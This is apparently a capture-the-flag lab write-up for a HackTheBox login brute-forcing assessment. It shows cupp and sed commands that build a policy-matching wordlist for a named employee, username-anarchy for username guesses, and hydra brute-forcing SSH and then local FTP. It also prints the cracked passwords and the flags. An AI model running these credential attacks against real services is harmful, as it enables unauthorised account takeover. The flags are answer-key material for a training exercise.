# Skills Assessment - Service Login

We are given the IP address of an online academy but have no further information about their website. As the first step of conducting a Penetration Testing engagement, we have to determine whether any weak credentials are used across the website and other login services.

Look beyond just default/common passwords. Use the skills learned in this module to gather information about employees we identified to create custom wordlists to attack their accounts.

Attack the web application and submit two flags using the skills we covered in the module sections and submit them to complete this module.

**Questions**

As you now have the name of an employee from the previous skills assessment question, try to gather basic information about them, and generate a custom password wordlist that meets the password policy. Also use 'usernameGenerator' to generate potential usernames for the employee. Finally, try to brute force the SSH server shown above to get the flag.

A name of an employee can be found inside the admin panel of the previous skills assessment exercise. To reduce the length of the wordlist, don't input too much information about the victim. Start with only their first name, and if you don't get a hit, then start adding information gradually to build bigger wordlists.

```bash
#Welcome back Mr. Harry Potter! 
cupp -i
sed -ri '/^.{,7}$/d' harry.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' harry.txt # remove no special chars
sed -ri '/[0-9]+/!d' harry.txt            # remove no numbers
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy 
./username-anarchy Harry Potter > ../username.txt
hydra -L username.txt -P harry.txt -u -f ssh://94.237.55.163:59407 -t 4
#[59407][ssh] host: 94.237.55.163   login: harry.potter   password: H4rry!!!
ssh harry.potter@94.237.55.163 -p 59407
HTB{4lw4y5_u53_r4nd0m_p455w0rd_63n3r470r}
```

Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag.

```bash
ls /home
netstat -antp | grep -i list
hydra -l g.potter -P rockyou-30.txt -u -f ftp://127.0.0.1 -t 4
#[21][ftp] host: 127.0.0.1   login: g.potter   password: harry
ftp 127.0.0.1
get flag.txt
cat flag.txt
HTB{1_50l3mnly_5w34r_7h47_1_w1ll_u53_r4nd0m_p455w0rd5}
```
